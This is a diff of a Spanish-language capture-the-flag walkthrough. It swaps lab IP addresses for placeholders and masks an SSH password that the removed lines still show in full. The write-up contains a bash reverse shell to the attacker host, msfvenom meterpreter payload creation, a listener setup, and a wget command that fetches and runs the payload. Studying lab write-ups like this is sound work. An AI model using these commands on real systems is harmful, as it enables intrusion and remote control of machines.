@@ -4,7 +4,7 @@
 
 ```bash
 # Nmap scan
-nmap -p 22,80,8000 -sS -sC -sV  -n -Pn 192.168.200.15 -oN nmap
+nmap -p 22,80,8000 -sS -sC -sV  -n -Pn (IP-victima) -oN nmap
 •22/tcp   open   ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
 •80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
 •8080/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
@@ -15,7 +15,7 @@ Encontramos una página con un solo h1 "Zerodium", posiblemente un usuario.
 ### Fuzzing
 
 ```bash
-gobuster dir -u 192.168.200.15 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -x .php,.sh
+gobuster dir -u (IP-victima) -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -x .php,.sh
 /index.php
 ```
 
@@ -49,7 +49,7 @@ nc -nlvp 443
 Ejecutamos la reverseshell dentro de la máquina víctima:
 
 ```bash
-bash -c "bash -i >& /dev/tcp/192.168.200.5/443 0>&1"
+bash -c "bash -i >& /dev/tcp/(IP-atacante)/443 0>&1"
 ```
 
 Ya estamos dentro como root, pero vemos que somos root dentro del casillero de un Docker.
@@ -69,14 +69,14 @@ Luego de intentar varias cosas, vemos el historial:
 
 ```bash
 history
-•1  sshpass -p 'L14mD0ck3Rp0w4' ssh liam@127.0.0.1
+•1  sshpass -p 'L************4' ssh liam@127.0.0.1
 ```
 
 Ingresamos como liam:
 
 ```bash
-ssh liam@192.168.200.15
-pass: L14mD0ck3Rp0w4
+ssh liam@(IP-victima)
+pass: L*************4
 ```
 
 ```bash
@@ -94,7 +94,7 @@ msfvenom -l payloads | grep -i windows
 Creamos el payload ".exe":
 
 ```bash
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.200.5 LPORT=443 -f exe > reverse.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=(IP-atacante) LPORT=443 -f exe > reverse.exe
 ```
 
 Ponemos a escuchar METERPRETER:
@@ -105,7 +105,7 @@ use multi/handler
 **meterpreter**
 show options
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
-set LHOST 192.168.200.5
+set LHOST (IP-atacante)
 set lport 443
 ```
 
@@ -118,7 +118,7 @@ python3 -m http.server 8000
 Dentro de la máquina víctima obtenemos el payload:
 
 ```bash
-wget http://192.168.200.5:8000/reverse.exe
+wget http://(IP-atacante):8000/reverse.exe
 ```
 
 Ejecutamos como root el comando mediante "wine":
@@ -131,4 +131,4 @@ Recibimos la reverseshell en nuestra máquina atacante. Para que la consola sea 
 
 **Recuerden que creamos un payload para Windows, así que ahora toca usar comandos de Windows, tales como dir, type, etc.**
 
-Ya somos root (:D)
+Ya somos root :D
